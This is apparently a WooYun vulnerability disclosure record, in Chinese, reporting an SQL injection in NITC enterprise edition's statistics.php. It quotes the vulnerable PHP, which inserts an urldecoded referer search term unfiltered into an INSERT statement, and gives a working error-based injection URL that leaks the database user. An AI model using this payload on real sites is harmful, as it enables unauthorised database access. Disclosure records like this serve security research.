{"id": 40735, "wybug_id": "wooyun-2015-090952", "wybug_title": "NITC企业版SQL注入#3", "wybug_corp": "NITC", "wybug_author": "路人甲", "wybug_date": "2015-01-13 15:27", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  在statistic.php中:\nif ( trim( $_GET['pageurl'] ) != \"\" ){    $search_text = \"\";    $referer = trim( $_GET['referer'] );    $domain = substr( $referer, strpos( $referer, \"//\" ) + 2 );    $domain = substr( $domain, 0, strpos( $domain, \"/\" ) );    if ( strpos( $domain, \"google.\" ) === FALSE )    {        $string = explode( \"q=\", $referer );        $string = explode( \"&\", $string[1] );        $search_text = urldecode( $string[0] );    }.......... $search_text = str_replace( \"+\", \" \", $search_text );    time( )( \"insert into \".$site->table( \"statistics\" ).\" (referer,pageurl,firsttime,lasttime,timezone,ip,date_added,domain,search_text) value    ('\".trim( $_GET['referer'] ).\"','\".trim( $_GET['pageurl'] ).\"','\".trim( $_GET['firsttime'] ).\"','\".trim( $_GET['lasttime'] ).\"','\".trim( $_GET['timezone'] ).\"','\".real_ip( ).\"','\".date( \"Y-m-d H:i:s\", time( ) ).\"','\".$domain.\"','\".$search_text.\"')\" );\n在这里$search_text可以通过$_GET['referer']的值转变而来，然后做了一次urldecode解码操作,但解码后没有做任何过滤。  接着就带入到了最后的insert语句中，造成sql语句POC:statistics.php?pageurl=123&referer=//google.php?q=asd%27 or (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a))-- /\n\n   漏洞证明：  POC:statistics.php?pageurl=123&referer=//google.php?q=asd%27 or (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a))-- /\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}